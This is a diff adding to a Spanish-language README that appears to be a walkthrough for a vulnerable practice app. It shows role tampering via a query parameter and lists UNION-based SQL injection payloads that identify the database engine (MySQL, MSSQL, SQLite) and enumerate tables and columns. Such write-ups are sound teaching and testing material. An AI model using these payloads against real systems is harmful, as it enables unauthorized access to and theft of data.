@@ -10,6 +10,21 @@ Run: py app.py
 
 ### 1. Entrar a la ruta /posts y cambiar el query param role por 'admin', lo cual habilita un campo filtro
 ### 2. Inyectar sql en este campo filtro.
+   #### El objetivo es encontrar información sobre las db, tablas, columnas, como no sabemos que motor de BD utiliza, probamos con las sentencias SQL para distintos motores, para encontrar el motor que utiliza.
+   ##### MySQL
+   - ' UNION ALL SELECT table_schema, table_name, engine, version, row_format FROM information_schema.tables WHERE table_type = 'BASE TABLE' ORDER BY table_schema, table_name;--
+   - ' UNION ALL SELECT version();--
+   - ' UNION ALL SELECT schema_name FROM information_schema.schemata;--
+
+   ##### MSSQL
+   - ' UNION ALL SELECT name FROM master.dbo.sysdatabases;--
+   - ' UNION ALL SELECT name FROM master.sys.databases;--
+   - ' UNION ALL SELECT name FROM sys.dm_os_sys_info;--
+   - ' UNION ALL SELECT name FROM dbo.dm_os_sys_info;--
+
+   ##### SQLite
+   - ' UNION ALL select sqlite_version();--
+   #### En este ultimo intento vemos que el error refiere a cantidad de columnas que retorna, por lo que inferimos que algo retorno del select, entonces estamos ante un motor sqlite.
 
    #### Acá probamos con una sola columna, nos dicen que faltan más y vamos probando con más hasta que encontramos que son 3, ya que cambia de error
    - ' UNION ALL SELECT name FROM sqlite_master WHERE type='table'--
